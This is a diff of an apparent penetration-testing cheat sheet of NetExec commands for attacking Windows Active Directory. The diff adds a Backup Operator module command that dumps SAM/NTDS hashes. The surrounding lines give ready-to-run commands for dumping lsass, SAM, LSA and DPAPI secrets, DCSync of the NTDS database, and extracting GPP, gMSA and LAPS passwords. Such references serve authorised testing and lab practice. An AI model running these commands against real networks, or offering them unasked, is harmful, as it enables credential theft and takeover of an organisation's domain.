@@ -157,8 +157,11 @@ ldapsearch -o ldif_wrap=no -xLLLH ldap://<ip> -D '<domain>\<username>' -w '<pass
 nxc smb <ip> -u '<username>' -p '<password>' --sam --lsa --dpap
 # Dump lsass with lsassy module:
 nxc smb <ip> -u '<username>' -p '<password>' -M lsassy -o METHOD=comsvcs_stealth
+# Dump hashes from SAM/NTDS with Backup Operator
+nxc smb <ip> -u '<username>' -p '<password>' -M backup_operator
 # Extract passwords from the NTDS (dcsync)
 nxc smb <ip> -d <domain> -u '<username>' -p '<password>' --ntds
+
 
 ## Get GPP policies
 
@@ -167,10 +170,12 @@ nxc smb <dc-ip> -u '' -p '' -M gpp_password
 # `gpp_autologin` retrieves autologin information from the Registry.xml file
 nxc smb <dc-ip> -u '' -p '' -M gpp_autologin
 
+
 ## Group Managed Service Accounts (gMSA)
 
 # Requirements: user that can read msDS-ManagedPassword (Domain Admins cant read it by defualt)
 nxc ldap <ip> -u '<username>' -p '<password>' --gmsa
+
 
 ## LAPS (Local administrator password solution) - retrieves both LAPS v1 and v2 passwords
 
@@ -182,6 +187,7 @@ nxc smb <ip> -u '<username>' -p '<password>' -M spooler
 
 ## Check for WebDav Service
 nxc smb <ip> -u '<username>' -p '<password>' -M webdav
+
 
 ## Azure - Entra Connect Sync service username looks like 'MSOL_16fb75d0227d'
 
@@ -217,6 +223,7 @@ nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -
 nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET=<t_user> ACTION=read PRINCIPAL=<p_user>
 # Find users with DCSync rights on this domain
 nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET_DN="DC=htb,DC=LOCAL" ACTION=read RIGHTS=DCSync
+
 
 ## Enumerate Domain Trusts
 nxc ldap <ip> -u '<username>' -p '<password>' -M enum_trusts
